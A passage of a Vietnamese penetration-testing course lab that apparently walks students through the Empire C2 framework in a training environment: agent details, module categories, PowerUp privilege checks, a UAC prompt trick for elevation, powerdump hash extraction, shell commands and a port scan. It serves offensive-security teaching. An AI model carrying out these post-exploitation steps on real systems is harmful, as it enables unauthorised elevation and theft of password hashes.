+├──────────────────┼───────────────────────────────────────────────┤
+│ checkin_time     │ 2026-04-01T01:27:29+00:00                     │
+├──────────────────┼───────────────────────────────────────────────┤
+│ children         │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ delay            │ 1                                             │
+├──────────────────┼───────────────────────────────────────────────┤
+│ external_ip      │ 10.130.10.25                                  │
+├──────────────────┼───────────────────────────────────────────────┤
+│ functions        │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ high_integrity   │ 0                                             │
+├──────────────────┼───────────────────────────────────────────────┤
+│ hostname         │ SEC560STUDENT                                 │
+├──────────────────┼───────────────────────────────────────────────┤
+│ internal_ip      │ 10.130.10.25                                  │
+├──────────────────┼───────────────────────────────────────────────┤
+│ jitter           │ 0.0                                           │
+├──────────────────┼───────────────────────────────────────────────┤
+│ kill_date        │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ language         │ powershell                                    │
+├──────────────────┼───────────────────────────────────────────────┤
+│ language_version │ 5                                             │
+├──────────────────┼───────────────────────────────────────────────┤
+│ lastseen_time    │ 2026-04-01T01:33:41+00:00                     │
+├──────────────────┼───────────────────────────────────────────────┤
+│ listener         │ http                                          │
+├──────────────────┼───────────────────────────────────────────────┤
+│ lost_limit       │ 60                                            │
+├──────────────────┼───────────────────────────────────────────────┤
+│ name             │ agent1                                        │
+├──────────────────┼───────────────────────────────────────────────┤
+│ nonce            │ 6951096813542968                              │
+├──────────────────┼───────────────────────────────────────────────┤
+│ notes            │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ os_details       │ Microsoft Windows 10 Enterprise               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ parent           │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ process_id       │ 1916                                          │
+├──────────────────┼───────────────────────────────────────────────┤
+│ process_name     │ powershell                                    │
+├──────────────────┼───────────────────────────────────────────────┤
+│ profile          │ /admin/get.php,/news.php,/login/process.php|M │
+│                  │ ozilla/5.0 (Windows NT 6.1; WOW64;            │
+│                  │ Trident/7.0; rv:11.0) like Gecko              │
+├──────────────────┼───────────────────────────────────────────────┤
+│ proxy            │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ servers          │                                               │
+├──────────────────┼───────────────────────────────────────────────┤
+│ session_id       │ 4A179ENU                                      │
+├──────────────────┼───────────────────────────────────────────────┤
+│ session_key      │ PB._Dh;|g20Gr<q81N^b]oE6s@x[\H&Y              │
+├──────────────────┼───────────────────────────────────────────────┤
+│ stale            │ False                                         │
+├──────────────────┼───────────────────────────────────────────────┤
+│ username         │ SEC560STUDENT\sec560                          │
+├──────────────────┼───────────────────────────────────────────────┤
+│ working_hours    │                                               │
+└──────────────────┴───────────────────────────────────────────────┘
+
+(Empire: agent1) >
+```
+
+Tại đây bạn có thể thấy thông tin quan trọng về tác nhân, bao gồm cả địa chỉ IP `process_name`, thời gian đăng nhập lần cuối và nhiều thông tin khác. Để kiểm tra xem tác nhân của chúng ta có đang hoạt động và liên lạc lại với trình lắng nghe mỗi giây hay không, hãy chạy lệnh `info` hai lần và ghi lại sự khác biệt về thời gian dựa trên giá trị `lastseen_time`:
+
+### 6. Mô đun
+
+Giờ chúng ta đã triển khai được một tác nhân và nó đang giao tiếp với trình lắng nghe, hãy cùng xem xét các mô-đun có sẵn để thực thi trên tác nhân đó:
+
+```bash
+usemodule
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-25.png)
+
+Giờ đây bạn sẽ thấy toàn bộ bộ sưu tập hơn 100 mô-đun khác nhau. Lưu ý rằng chúng được phân loại thành nhiều nhóm khác nhau, bao gồm:
+
+- `code_execution`: Các mô-đun này cho phép bạn chạy mã, bao gồm cả các payload của Metasploit, trên máy chủ mục tiêu..
+
+- `collection`:  Các mô-đun này cho phép bạn thu thập thông tin từ máy mục tiêu.
+
+- `credentials`: Các mô-đun này cho phép bạn đánh cắp tên người dùng, mã băm và mật khẩu từ mục tiêu.
+
+- `exploitation`: Các mô-đun này cho phép bạn khai thác thêm các mục tiêu khác.
+
+- `lateral_movement`: Các mô-đun này cho phép bạn xoay trục sang các máy mục tiêu khác.
+
+- `management`: Các mô-đun này liên quan đến các chức năng quản trị hệ thống trên thiết bị mục tiêu.
+
+- `persistence`:  Các mô-đun này sẽ giúp tác nhân của bạn tiếp tục hoạt động ngay cả khi người dùng đăng xuất hoặc khởi động lại máy.
+
+- `privesc`: Các mô-đun này cung cấp các lỗ hổng leo thang đặc quyền.
+
+- `recon`: Đây là các mô-đun trinh sát.
+
+- `situational_awareness`: Các mô-đun này thu thập thông tin từ môi trường mục tiêu, bao gồm máy quét và các công cụ liên quan.
+
+- `trollsploit`: Các mô-đun này cho phép bạn quấy rối người dùng đang ngồi trước máy tính của nạn nhân, bao gồm phát âm thanh và hiển thị các hộp thoại.
+
+Bạn cũng sẽ thấy một tiền tố cho biết cách thức thực thi của tệp tin. `- csharp` (C#) `- python` `- powershell`.
+
+Hãy cùng thử nghiệm với một số mô-đun hữu ích nhất trong số này.
+
+Hãy chạy một mô-đun có tên là `usemodule powershell/situational_awareness/host/winenum`. Chúng ta sẽ bắt đầu bằng cách chọn nó thông qua lệnh `usemodule`:
+
+```bash
+usemodule powershell/situational_awareness/host/winenum
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-26.png)
+
+Lưu ý rằng Empire tự động thiết lập `Agent` cài đặt thành `agent2`.
+
+Mô-đun này thu thập thông tin hữu ích từ máy mục tiêu, bao gồm thông tin về phần mềm và các tập tin trên máy.
+
+Bây giờ chúng ta sẽ chạy mô-đun `winenum`:
+
+![alt text](IMG/LAB2/LAB2.4/image-27.png)
+
+Lưu ý rằng khi chúng ta chạy một mô-đun, Empire sẽ tạo một tác vụ trên máy đích và chạy tác vụ đó trong nền. Nếu bạn nhấn Enter, dấu nhắc lệnh sẽ hiện lại. Tác vụ được gán một ID.
+
+Hãy để công việc chạy khoảng 30 giây, sau đó kiểm tra kết quả. Để làm điều này, chúng ta cần sử dụng lệnh `view`. Trong ví dụ trên, ID là 1, nhưng số của bạn có thể khác. Sử dụng ID này để xem kết quả của tác vụ/công việc.
+
+```bash
+view 1
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-28.png)
+
+Hãy xem qua kết quả đầu ra. Tác vụ sẽ tiếp tục chạy. Để xem thêm kết quả đầu ra từ tác vụ, hãy chạy viewlại lệnh.
+
+### 7. Tìm kiếm sự leo thang đặc quyền
+
+Tiếp theo, hãy xem liệu có bất kỳ cơ hội leo thang đặc quyền nào trên mục tiêu hay không. Các mô-đun PowerUp có rất nhiều phương pháp leo thang đặc quyền thông qua PowerShell. Hãy tìm kiếm các mô-đun đó:
+
+![alt text](IMG/LAB2/LAB2.4/image-29.png)
+
+Chúng ta có thể thấy rằng PowerUp có một tính năng sẽ chạy tất cả các kiểm tra về leo thang đặc quyền `powershell/privesc/powerup/allchecks`. Hãy chọn tính năng đó và chạy nó:
+
+```bash
+usemodule powershell/privesc/powerup/allchecks
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-30.png)
+
+```bash
+execute
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-31.png)
+
+Để xem kết quả của tác vụ, chúng ta cần sử dụng lệnh `view` với ID tác vụ đã nêu ở trên.
+
+![alt text](IMG/LAB2/LAB2.4/image-32.png)
+
+![alt text](IMG/LAB2/LAB2.4/image-34.png)
+
+![alt text](IMG/LAB2/LAB2.4/image-35.png)
+
+Trong kết quả đầu ra, bạn sẽ thấy thông báo:
+
+```bash
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+```
+
+Ngoài ra, hãy chú ý đến các đường dẫn dịch vụ không được trích dẫn. Chúng ta sẽ thảo luận về cách khai thác điều này sau trong khóa học.
+
+Trước khi nâng cao quyền hạn, hãy xem xét những hạn chế mà chúng ta gặp phải khi không có đầy đủ quyền quản trị trong tác nhân của mình. Để làm điều đó, hãy thử trích xuất các mã băm từ mục tiêu từ tác nhân không được nâng cao quyền. Chúng ta sẽ sử dụng mô-đun `powerdump`, thuộc danh mục thông tin xác thực và ban đầu được bao gồm trong công cụ Posh-SecMod:
+
+```bash
+usemodule powershell/credentials/powerdump
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-36.png)
+
+Hãy thử chạy nó xem sao:
+
+```bash
+execute
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-37.png)
+
+### 8. Bypass UAC
+
+UAC là viết tắt của User Account Control trên Windows. Nó là cơ chế bảo mật giúp:
+
+- Ngăn chương trình tự ý chạy với quyền quản trị.
+
+- Yêu cầu xác nhận khi có thao tác nhạy cảm.
+
+- Giảm nguy cơ malware âm thầm chiếm quyền admin.
+
+Tiếp theo, chúng ta sẽ cố gắng vượt qua UAC để có được quyền truy cập cao hơn cần thiết để trích xuất các mã băm.
+
+Đầu tiên, hãy thoát khỏi ngữ cảnh của `powerdump`. Điều đó sẽ đưa bạn trở lại ngữ cảnh của `agent1`:
+
+```bash
+back
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-38.png)
+
+Bây giờ chúng ta sẽ chạy một mô-đun tấn công có tên gọi `privesc/ask` đơn giản là hiển thị cửa sổ UAC, yêu cầu người dùng đã đăng nhập vào Windows cho phép thực thi một chương trình. Mặc dù điều đó có thể cảnh báo một người dùng cẩn thận, nhưng hầu hết người dùng sẽ chỉ nhấp vào Có . Mặc dù có những lỗ hổng khác để vượt qua UAC, nhưng Microsoft thường xuyên vá lỗi chúng. Nhưng một cú nhấp chuột đơn giản vào Có của người dùng hoạt động rất hiệu quả, ngay cả trên một máy tính Windows đã được vá lỗi đầy đủ. Để sử dụng mô-đun `privesc/ask`, vui lòng nhập:
+
+```bash
+usemodule powershell/privesc/ask
+```
+
+```bash
+(Empire: agent2) > usemodule powershell/privesc/ask
+[*] Set Agent to agent2
+
+ Author       Jack64
+ Background   True
+ Comments     https://github.com/rapid7/metasploit-
+              framework/blob/master/modules/exploits/windows/local/ask.rb
+ Description  Leverages Start-Process' -Verb runAs option inside a YES-Required loop
+              to prompt the user for a high integrity context before running the
+              agent code. UAC will report Powershell is requesting Administrator
+              privileges. Because this does not use the BypassUAC DLLs, it should
+              not trigger any AV alerts.
+ Language     powershell
+ Name         powershell/privesc/ask
+ NeedsAdmin   False
+ OpsecSafe    False
+ Techniques   http://attack.mitre.org/techniques/T1088
+
+
+┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
+│ Name             │ Value              │ Required │ Description                         │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Agent            │ agent2             │ True     │ Agent to run module on.             │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
+│                  │                    │          │ to be prepended to the launcher.    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Listener         │                    │ True     │ Listener to use.                    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
+│                  │                    │          │ powershell code, uses the           │
+│                  │                    │          │ ObfuscateCommand for obfuscation    │
+│                  │                    │          │ types. For powershell only.         │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
+│                  │                    │          │ use. Only used if Obfuscate switch  │
+│                  │                    │          │ is True. For powershell only.       │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
+│                  │                    │          │ none, or other).                    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
+│                  │                    │          │ ([domain\]username:password) to use │
+│                  │                    │          │ for request (default, none, or      │
+│                  │                    │          │ other).                             │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
+│                  │                    │          │ staging request (default, none, or  │
+│                  │                    │          │ other).                             │
+└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
+```
+
+Bây giờ chúng ta cần thông báo cho Empire rằng nếu mô-đun này hoạt động thành công, nó sẽ kết nối lại với trình lắng nghe của chúng ta. Để làm điều này, chúng ta chỉ cần chỉ định tên của trình lắng nghe `http`.
+
+```bash
+set Listener http
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-39.png)
+
+Giờ chúng ta đã sẵn sàng chạy mô-đun rồi!
+
+```bash
+execute
+```
+
+Thường thì Windows sẽ hiển thị một lời nhắc UAC cho biết nó được đặt trên màn hình bởi Windows PowerShell, với nhà phát hành đã được xác minh là Microsoft Windows. Tất nhiên, chính Empire Agent là phần mềm làm cho điều này xuất hiện, sử dụng PowerShell để làm cho nó trông giống như một hành động hợp pháp trên máy mục tiêu.
+
+Trong trường hợp của chúng tôi, hệ thống Windows của bạn không hiển thị thông báo (do UAC được đặt ở chế độ "Thấp"). Tuyệt vời!
+
+Giờ chúng ta hãy cùng xem xét các đặc vụ của mình.
+
+```bash
+agents
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-40.png)
+
+Hãy chú ý đến dấu sao `*` bên cạnh tên của đặc vụ mới. Dấu sao đó có nghĩa là đây là phiên làm việc được nâng cao, với đầy đủ quyền quản trị. Tài liệu của Empire đôi khi gọi những đặc vụ này là các đặc vụ "có tính toàn vẹn cao", và chúng rất tuyệt vời vì cho phép chúng ta khai thác triệt để hệ thống, bao gồm cả việc lấy được các mã băm từ máy chủ.
+
+Hãy đổi tên phiên làm việc của tác nhân nâng cao mới của chúng ta thành `priv1` và sau đó là `list` các tác nhân.
+
+```bash
+rename UG327LDV priv1
+list
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-41.png)
+
+Bây giờ chúng ta hãy tương tác với phiên làm việc có quyền quản trị mới. Hãy chắc chắn rằng bạn đã chạy lệnh `list` ở bước trước, nếu không bạn sẽ không thể tương tác với tác nhân mới bằng tên mới.
+
+![alt text](IMG/LAB2/LAB2.4/image-42.png)
+
+Và bây giờ chúng ta có thể thử chạy powerdumplại để lấy các mã băm:
+
+![alt text](IMG/LAB2/LAB2.4/image-43.png)
+
+```bash
+execute
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-44.png)
+
+> Lưu ý rằng giờ nó hoạt động vì chúng ta đã vượt qua UAC để có được phiên tác nhân có tính toàn vẹn cao (quyền hạn cao hơn). Và chúng ta đã có được các mã băm từ mục tiêu!
+
+Một lần nữa, Empire tạo ra một tác vụ. Hãy đợi một chút, sau đó xem kết quả tác vụ.
+
+```bash
+view 1
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-45.png)
+
+Tuyệt vời! Chúng ta vừa nhận được mã băm rồi!
+
+Để chạy các lệnh `shell` từ tác nhân của chúng ta, chúng ta thực hiện lệnh `shell` sau, tiếp theo là lệnh mà chúng ta muốn chạy:
+
+```bash
+shell ipconfig
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-46.png)
+
+Hãy cùng xem kết quả bằng cách quan sát đầu ra của tác vụ.
+
+![alt text](IMG/LAB2/LAB2.4/image-47.png)
+
+Bạn sẽ thấy kết quả của lệnh `ipconfig` trên màn hình.
+
+Nếu có thời gian, bạn có thể thử nghiệm với các lệnh PowerShell khác, chẳng hạn như `ps`, `pwd`, và `dir`. Ngoài ra, hãy sử dụng một số thủ thuật PowerShell mà bạn đã học trong khóa học này.
+
+### 9. Port Scan
+
+Tiếp theo, chúng ta hãy tiến hành quét cổng từ tác nhân Empire, cho nó quét máy 10.130.10.25. Chúng ta sẽ bắt đầu bằng cách tìm kiếm portscanmô-đun:
+
+```bash
+usemodule powershell/situational_awareness/network/portscan
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-48.png)
+
+![alt text](IMG/LAB2/LAB2.4/image-49.png)
+
+Mặc định là quét 50 cổng TCP hàng đầu. Chúng ta sẽ để nguyên như vậy trước mắt. Chúng ta cần phải chỉ định một phạm vi mục tiêu.
+
+Tiếp theo, chúng ta cần chỉ định mục tiêu và chạy mô-đun.
+
+```bash
+set Hosts 10.130.10.25
+execute
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-50.png)
+
+Hãy đợi khoảng 30 giây, sau đó xem kết quả thực hiện tác vụ.
+
+```bash
+view 3
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-51.png)
+
+Bạn sẽ thấy rằng các cổng 80, 3389, 445, 129, 135 đang lắng nghe trên máy có địa chỉ IP 10.130.10.10.
+
+### 10. Tắt agent
+
+Để kết thúc buổi thực hành, chúng ta hãy tắt các tác nhân.
+
+```bash
+agents
+kill all
+y
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-52.png)
+
+Giờ chúng ta kill listener của chúng ta:
+
+```bash
+listeners
+kill all
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-53.png)
+
+Và cuối cùng, hãy cùng xem xét `exit` để thoát Empire:
+
+```bash
+exit
+```
+
+![alt text](IMG/LAB2/LAB2.4/image-54.png)
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã thấy cách các chuyên gia kiểm thử xâm nhập có thể sử dụng Empire để cấu hình và điều khiển các listener và agent. Chúng ta cũng đã chạy một số module khác nhau trên mục tiêu thông qua một agent, bao gồm PowerUp, để tìm các lỗ hổng leo thang đặc quyền cục bộ tiềm ẩn. Chúng ta đã vượt qua UAC bằng cách yêu cầu người dùng chạy một agent có đặc quyền cao trên mục tiêu. Chúng ta đã trích xuất các hash bằng `powerdumpmodule` của Empire, và chúng ta cũng đã thực hiện quét cổng từ một agent trên mục tiêu bị xâm nhập.
+
+Mỗi kỹ thuật này đều vô cùng hữu ích cho các chuyên gia kiểm thử xâm nhập trong giai đoạn hậu khai thác của một dự án kiểm thử xâm nhập hoặc hoạt động của nhóm Red Team.
+
